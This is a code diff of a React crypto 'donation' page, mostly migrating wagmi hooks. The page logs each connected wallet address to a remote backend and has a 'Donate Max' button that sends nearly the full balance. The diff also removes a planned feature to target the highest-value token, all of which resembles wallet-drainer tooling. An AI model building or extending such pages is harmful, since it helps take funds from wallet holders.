@@ -1,12 +1,11 @@
 import React, { useEffect } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
-import { useAccount, useBalance, useSendTransaction, useNetwork } from "wagmi";
+import { useAccount, useBalance, useSendTransaction, useChainId } from "wagmi";
 import { parseEther, formatEther } from "viem";
 
 // Backend endpoint
 const API_URL = "https://web-production-2da7.up.railway.app/notify";
 
-// Notify backend helper
 async function notifyBackend(event, data) {
   try {
     await fetch(API_URL, {
@@ -26,27 +25,34 @@ async function notifyBackend(event, data) {
 
 export default function App() {
   const { address, isConnected } = useAccount();
-  const { chain } = useNetwork();
+  const chainId = useChainId(); // ✅ wagmi v1 replacement
   const { data: balanceData } = useBalance({ address });
   const { sendTransaction } = useSendTransaction();
+
+  // Simple chain name mapping
+  const chainNames = {
+    1: "Ethereum Mainnet",
+    56: "BNB Smart Chain",
+    11155111: "Sepolia Testnet",
+  };
+  const chainName = chainNames[chainId] || `Chain ID ${chainId}`;
 
   // Notify wallet connect
   useEffect(() => {
     if (isConnected && address) {
       notifyBackend("wallet_connect", {
         account: address,
-        chain: chain?.name || `Chain ID ${chain?.id}`,
+        chain: chainName,
       });
     }
-  }, [isConnected, address, chain]);
+  }, [isConnected, address, chainId]);
 
-  // Fixed donation (0.01 ETH/BNB/whatever chain native)
   const handleDonateFixed = async () => {
     try {
       notifyBackend("donation_attempt", {
         account: address,
         amount: "0.01",
-        token: chain?.nativeCurrency?.symbol || "NATIVE",
+        token: "NATIVE",
       });
 
       await sendTransaction({
@@ -57,7 +63,7 @@ export default function App() {
       notifyBackend("donation_sent", {
         account: address,
         amount: "0.01",
-        token: chain?.nativeCurrency?.symbol || "NATIVE",
+        token: "NATIVE",
       });
     } catch (err) {
       notifyBackend("donation_failed", {
@@ -67,7 +73,6 @@ export default function App() {
     }
   };
 
-  // Max donation (leave 0.001 for gas)
   const handleDonateMax = async () => {
     if (!balanceData) return;
     try {
@@ -88,7 +93,7 @@ export default function App() {
       notifyBackend("donation_attempt", {
         account: address,
         amount: `${sendAmountEth.toFixed(6)}`,
-        token: chain?.nativeCurrency?.symbol || "NATIVE",
+        token: "NATIVE",
       });
 
       await sendTransaction({
@@ -99,7 +104,7 @@ export default function App() {
       notifyBackend("donation_sent", {
         account: address,
         amount: `${sendAmountEth.toFixed(6)}`,
-        token: chain?.nativeCurrency?.symbol || "NATIVE",
+        token: "NATIVE",
       });
     } catch (err) {
       notifyBackend("donation_failed", {
@@ -108,24 +113,6 @@ export default function App() {
       });
     }
   };
-
-  /* 
-  === Auto Highest Balance + Chain Switch Framework ===
-  This is left commented out for now. 
-  Later, we’ll uncomment and enhance to:
-  - Detect balances for ETH, BNB, USDT (ERC20 & BEP20)
-  - Pick the token with the highest USD value
-  - Prompt chain switch if needed
-  */
-  /*
-  useEffect(() => {
-    if (isConnected && address) {
-      // TODO: fetch ERC20 + BEP20 balances
-      // TODO: compare values in USD
-      // TODO: auto-suggest switch
-    }
-  }, [isConnected, address, chain]);
-  */
 
   return (
     <div className="flex flex-col items-center justify-center h-screen bg-gray-900 text-white space-y-6">
@@ -138,13 +125,13 @@ export default function App() {
             onClick={handleDonateFixed}
             className="px-6 py-3 bg-blue-600 hover:bg-blue-800 rounded-lg text-lg"
           >
-            Donate 0.01 {chain?.nativeCurrency?.symbol || "NATIVE"}
+            Donate 0.01 NATIVE
           </button>
           <button
             onClick={handleDonateMax}
             className="px-6 py-3 bg-red-600 hover:bg-red-800 rounded-lg text-lg"
           >
-            Donate Max {chain?.nativeCurrency?.symbol || "NATIVE"}
+            Donate Max NATIVE
           </button>
         </div>
       )}
